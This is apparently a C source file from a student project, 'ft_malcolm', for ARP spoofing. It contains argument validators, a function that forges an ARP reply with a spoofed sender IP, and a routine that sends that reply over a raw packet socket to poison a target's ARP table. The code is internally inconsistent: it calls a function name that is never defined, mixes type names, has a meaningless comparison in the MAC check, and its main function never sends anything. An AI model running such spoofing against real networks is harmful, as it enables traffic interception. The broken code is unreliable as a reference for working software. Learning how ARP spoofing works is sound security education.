#include "header.h"

int	ft_strlen(const char *str)
{
	int	i;

	i = 0;
	while (str[i] != '\0')
		i++;
	return (i);
}

int	ft_tolower(int character)
{
	if (character >= 'A' && character <= 'Z')
		return (character + 32);
	return (character);
}

int verify_ip_adress(const char *str) // str is ip address src or targ
{
    struct in_addr addr;
    if (inet_pton(AF_INET, str, &addr) != 1) // inet_pton rempli la struct addr 
        return 1;
    // printf("Ip %s is valid", str);
    return 0;
}


int verify_mac_adress(const char *mac_addr)
{
    int idx;
    char hexa[]  = "0123456789abcdef";

    idx = 0;
    if (ft_strlen(mac_addr) != 17)
       return 1;
    while (idx < 17)
    {
        if ((idx + 1) % 3 == 0 && idx + 1 != '\0')
        {
            if (mac_addr[idx] != ':')
                return 1;
        }
        else
        {
            char c = ft_tolower(mac_addr[idx]);
            int j = -1;
            int found = 0;
            while (hexa[++j])
            {
                if (c == hexa[j])
                {
                    found = 1;
                    break;
                }
            }
            if (!found)
                return 1;
        }
        idx++;
    }
    return 0;
}

int parse_args(int argc, char **argv)
{
    if (argc != 5)
       return (printf("Usage: \n./ft_malcom <src ip> <src mac address> <target ip> <target mac address>\n"), 1);
    else if (verify_ip_adress(argv[1]) == 1)
        return (printf("ft_malcolm: unknown host or invalid IP address: (%s)", argv[1]), 1);
    else if (verify_ip_adress(argv[3]) == 1)
        return (printf("ft_malcolm: unknown host or invalid IP address: %s", argv[3]), 1);
    else if (verify_mac_adress(argv[2]) == 1)
        return (printf("ft_malcolm: invalid mac address: (%s)", argv[2]), 1);
    else if (verify_mac_adress(argv[4]) == 1)
        return (printf("ft_malcolm: invalid mac address: (%s)", argv[4]), 1);
    printf("looks good");
    return 0;
}

int forge_arp_rep(arp_frame *frame, data *data)
{
    memset(frame, 0, sizeof(*frame));

    // Ethernet header
    memcpy(frame->ether.h_dest,   data->tgt_mac.bytes, 6);
    memcpy(frame->ether.h_source, data->src_mac.bytes, 6);
    frame->ether.h_proto = htons(ETH_P_ARP);
    // ARP header
    frame->arp.ar_hrd = htons(ARPHRD_ETHER);
    frame->arp.ar_pro = htons(ETH_P_IP);
    frame->arp.ar_hln = 6;
    frame->arp.ar_pln = 4; 
    frame->arp.ar_op  = htons(ARPOP_REPLY); 
    // ARP payload: "sender" is the IP we are spoofing
    memcpy(frame->sha, data->src_mac.bytes, 6);  // own
    memcpy(frame->sip, data->src_ip,        4);  // IP spoof
    memcpy(frame->tha, data->tgt_mac.bytes, 6);  // target MAC
    memcpy(frame->tip, data->tgt_ip,        4);  // target IP

    return (sizeof(t_arp_frame));
}

static int send_arp_reply(data *data)
{
    arp_frame frame;
    struct sockaddr_ll  sa;
    int                 len;

    len = build_arp_reply(&frame, data);
    memset(&sa, 0, sizeof(sa));
    sa.sll_family   = AF_PACKET;
    sa.sll_ifindex  = data->iface_idx;
    sa.sll_halen    = 6;
    memcpy(sa.sll_addr, data->tgt_mac.bytes, 6);

    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
    if (sendto(data->sockfd, &frame, len, 0,
               (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        return -1;
    }
    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
    return 0;
}

int main(int argc, char **argv)
{
    if (parse_args(argc, argv) == 1)
        return 1;

    return 0;
}